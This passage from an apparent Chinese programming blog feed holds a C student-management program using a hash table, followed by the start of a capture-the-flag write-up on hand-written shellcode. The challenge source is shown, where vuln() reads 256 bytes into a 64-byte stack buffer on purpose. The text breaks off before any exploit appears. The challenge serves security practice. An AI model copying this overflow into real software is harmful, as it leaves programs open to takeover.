class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STUDENT_INFORMATION <span class="string">&quot;Student_information.txt&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NAME_LEN 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_MAJOR_LEN 100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 学生结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[MAX_NAME_LEN];</span><br><span class="line">    <span class="type">int</span> stuid;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">char</span> major[MAX_MAJOR_LEN];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 学生数据库结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Student *buckets[HASH_SIZE];</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">&#125; StudentDB;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line">StudentDB* <span class="title function_">init_system</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">free_database</span><span class="params">(StudentDB *db)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Add_Stu</span><span class="params">(StudentDB *db, Student *stu)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_students_to_file</span><span class="params">(StudentDB *db)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Load_From_File</span><span class="params">(StudentDB *db, <span class="type">const</span> <span class="type">char</span> *filename)</span>;</span><br><span class="line">Student* <span class="title function_">Search_query_in_memory</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Show_All_Stu</span><span class="params">(StudentDB *db)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Remove_Student</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Modify_Stu</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_input_buffer</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">display_menu</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    StudentDB *db = init_system();</span><br><span class="line">    <span class="keyword">if</span> (db == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;系统初始化失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Load_From_File(db, STUDENT_INFORMATION);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;系统初始化完成，已加载 %d 名学生\n&quot;</span>, db-&gt;count);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        display_menu();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice) != <span class="number">1</span>) &#123;</span><br><span class="line">            clear_input_buffer();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入无效，请重新选择\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        clear_input_buffer();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">switch</span>(choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123; <span class="comment">// 添加学生</span></span><br><span class="line">                Student *new_stu = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Student));</span><br><span class="line">                <span class="keyword">if</span> (!new_stu) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入学号: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;new_stu-&gt;stuid);</span><br><span class="line">                clear_input_buffer();</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入姓名: &quot;</span>);</span><br><span class="line">                fgets(new_stu-&gt;name, <span class="keyword">sizeof</span>(new_stu-&gt;name), <span class="built_in">stdin</span>);</span><br><span class="line">                new_stu-&gt;name[<span class="built_in">strcspn</span>(new_stu-&gt;name, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入年龄: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;new_stu-&gt;age);</span><br><span class="line">                clear_input_buffer();</span><br><span class="line">                </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入专业: &quot;</span>);</span><br><span class="line">                fgets(new_stu-&gt;major, <span class="keyword">sizeof</span>(new_stu-&gt;major), <span class="built_in">stdin</span>);</span><br><span class="line">                new_stu-&gt;major[<span class="built_in">strcspn</span>(new_stu-&gt;major, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                Add_Stu(db, new_stu);</span><br><span class="line">                save_students_to_file(db);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// 显示所有学生</span></span><br><span class="line">                Show_All_Stu(db);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: &#123; <span class="comment">// 查询学生</span></span><br><span class="line">                <span class="type">int</span> stuid;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的学号: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;stuid);</span><br><span class="line">                clear_input_buffer();</span><br><span class="line">                </span><br><span class="line">                Student *stu = Search_query_in_memory(db, stuid);</span><br><span class="line">                <span class="keyword">if</span> (stu) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n查询结果:\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;学号: %d\n&quot;</span>, stu-&gt;stuid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;姓名: %s\n&quot;</span>, stu-&gt;name);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;年龄: %d\n&quot;</span>, stu-&gt;age);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;专业: %s\n&quot;</span>, stu-&gt;major);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;未找到学号为 %d 的学生\n&quot;</span>, stuid);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: &#123; <span class="comment">// 删除学生</span></span><br><span class="line">                <span class="type">int</span> stuid;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入要删除的学号: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;stuid);</span><br><span class="line">                clear_input_buffer();</span><br><span class="line">                Remove_Student(db, stuid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>: &#123; <span class="comment">// 修改学生</span></span><br><span class="line">                <span class="type">int</span> stuid;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;请输入要修改的学号: &quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;stuid);</span><br><span class="line">                clear_input_buffer();</span><br><span class="line">                Modify_Stu(db, stuid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: <span class="comment">// 退出系统</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;感谢使用学生管理系统，再见！\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;无效选择，请重新输入！\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (choice != <span class="number">6</span>);</span><br><span class="line">    </span><br><span class="line">    save_students_to_file(db);</span><br><span class="line">    free_database(db);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化学生数据库</span></span><br><span class="line">StudentDB* <span class="title function_">init_system</span><span class="params">()</span> &#123;</span><br><span class="line">    StudentDB *db = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StudentDB));</span><br><span class="line">    <span class="keyword">if</span> (db == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;内存分配失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_SIZE; i++) &#123;</span><br><span class="line">        db-&gt;buckets[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    db-&gt;count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放数据库内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_database</span><span class="params">(StudentDB *db)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (db == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_SIZE; i++) &#123;</span><br><span class="line">        Student *current = db-&gt;buckets[i];</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            Student *next = current-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(current);</span><br><span class="line">            current = next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(db);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加学生到哈希表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Add_Stu</span><span class="params">(StudentDB *db, Student *stu)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = stu-&gt;stuid % HASH_SIZE;</span><br><span class="line">    stu-&gt;next = db-&gt;buckets[hash];</span><br><span class="line">    db-&gt;buckets[hash] = stu;</span><br><span class="line">    db-&gt;count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学生 %d 添加成功！\n&quot;</span>, stu-&gt;stuid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存学生信息到文件</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_students_to_file</span><span class="params">(StudentDB *db)</span> &#123;</span><br><span class="line">    FILE *file = fopen(STUDENT_INFORMATION, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;无法打开文件&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_SIZE; i++) &#123;</span><br><span class="line">        Student *current = db-&gt;buckets[i];</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(file, <span class="string">&quot;%d,%s,%d,%s\n&quot;</span>, </span><br><span class="line">                   current-&gt;stuid, current-&gt;name, </span><br><span class="line">                   current-&gt;age, current-&gt;major);</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件加载学生信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Load_From_File</span><span class="params">(StudentDB *db, <span class="type">const</span> <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    FILE *file = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">        Student *newStudent = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Student));</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%d,%[^,],%d,%[^,\n]&quot;</span>, </span><br><span class="line">                  &amp;newStudent-&gt;stuid, newStudent-&gt;name, </span><br><span class="line">                  &amp;newStudent-&gt;age, newStudent-&gt;major) == <span class="number">4</span>) &#123;</span><br><span class="line">            Add_Stu(db, newStudent);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">free</span>(newStudent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在内存中查找学生</span></span><br><span class="line">Student* <span class="title function_">Search_query_in_memory</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = stuid % HASH_SIZE;</span><br><span class="line">    Student *current = db-&gt;buckets[hash];</span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;stuid == stuid) &#123;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示所有学生信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Show_All_Stu</span><span class="params">(StudentDB *db)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (db-&gt;count == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;当前没有学生记录\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n当前所有学生信息:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学号\t姓名\t年龄\t专业\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_SIZE; i++) &#123;</span><br><span class="line">        Student *current = db-&gt;buckets[i];</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\t%s\t%d\t%s\n&quot;</span>, </span><br><span class="line">                  current-&gt;stuid, current-&gt;name, </span><br><span class="line">                  current-&gt;age, current-&gt;major);</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从内存中删除学生</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Remove_Student_From_Memory</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = stuid % HASH_SIZE;</span><br><span class="line">    Student **ptr = &amp;db-&gt;buckets[hash];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (*ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*ptr)-&gt;stuid == stuid) &#123;</span><br><span class="line">            Student *to_delete = *ptr;</span><br><span class="line">            *ptr = (*ptr)-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(to_delete);</span><br><span class="line">            db-&gt;count--;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = &amp;(*ptr)-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除学生</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Remove_Student</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Remove_Student_From_Memory(db, stuid)) &#123;</span><br><span class="line">        save_students_to_file(db);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;学生 %d 已删除\n&quot;</span>, stuid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到学号为 %d 的学生\n&quot;</span>, stuid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改学生信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Modify_Stu</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    Student *stu = Search_query_in_memory(db, stuid);</span><br><span class="line">    <span class="keyword">if</span> (stu == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到学号为 %d 的学生\n&quot;</span>, stuid);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n当前学生信息:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学号: %d\n&quot;</span>, stu-&gt;stuid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;姓名: %s\n&quot;</span>, stu-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;年龄: %d\n&quot;</span>, stu-&gt;age);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;专业: %s\n&quot;</span>, stu-&gt;major);</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> input[MAX_NAME_LEN];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n输入新信息(直接回车保留原值):\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新姓名 [%s]: &quot;</span>, stu-&gt;name);</span><br><span class="line">    <span class="keyword">if</span> (fgets(input, <span class="keyword">sizeof</span>(input), <span class="built_in">stdin</span>) &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        input[<span class="built_in">strcspn</span>(input, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(stu-&gt;name, input, <span class="keyword">sizeof</span>(stu-&gt;name));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新年龄 [%d]: &quot;</span>, stu-&gt;age);</span><br><span class="line">    <span class="keyword">if</span> (fgets(input, <span class="keyword">sizeof</span>(input), <span class="built_in">stdin</span>) &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        stu-&gt;age = atoi(input);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新专业 [%s]: &quot;</span>, stu-&gt;major);</span><br><span class="line">    <span class="keyword">if</span> (fgets(input, <span class="keyword">sizeof</span>(input), <span class="built_in">stdin</span>) &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        input[<span class="built_in">strcspn</span>(input, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(stu-&gt;major, input, <span class="keyword">sizeof</span>(stu-&gt;major));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    save_students_to_file(db);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n学生信息更新成功!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除输入缓冲区</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_input_buffer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="keyword">while</span> ((c = getchar()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示菜单</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">display_menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n学生管理系统\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1. 添加学生\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2. 显示所有学生\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3. 查询学生\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4. 删除学生\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5. 修改学生信息\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;6. 退出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请选择操作: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C-STUDY </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C-STUDY </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手写shellcode做连接</title>
      <link href="/2026/01/21/%E6%89%8B%E5%86%99shellcode%E5%81%9A%E8%BF%9E%E6%8E%A5/"/>
      <url>/2026/01/21/%E6%89%8B%E5%86%99shellcode%E5%81%9A%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><p>首先我们看看赛题环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">// 禁用缓冲区</span><br><span class="line">void init() &#123;</span><br><span class="line">    setvbuf(stdout, NULL, _IONBF, 0);</span><br><span class="line">    setvbuf(stdin, NULL, _IONBF, 0);</span><br><span class="line">    setvbuf(stderr, NULL, _IONBF, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 存在缓冲区溢出漏洞的函数</span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char buf[64];  // 栈上缓冲区</span><br><span class="line">    printf(&quot;Input your data: &quot;);</span><br><span class="line">    read(0, buf, 256);  // 明显的缓冲区溢出 - 读取256字节到64字节缓冲区</span><br><span class="line">    printf(&quot;You entered: %s\n&quot;, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    init();</span><br><span class="line">    printf(&quot;Welcome to the 64-bit buffer overflow challenge!\n&quot;);</span><br><span class="line">    printf(&quot;This program has a classic buffer overflow vulnerability.\n&quot;);</span><br><span class="line">    printf(&quot;Find a way to exploit it and get a shell!\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">    printf(&quot;Returned to main function. Exiting normally.\n&quot;);</span><br><span class="line">    return 0;</span><br><span 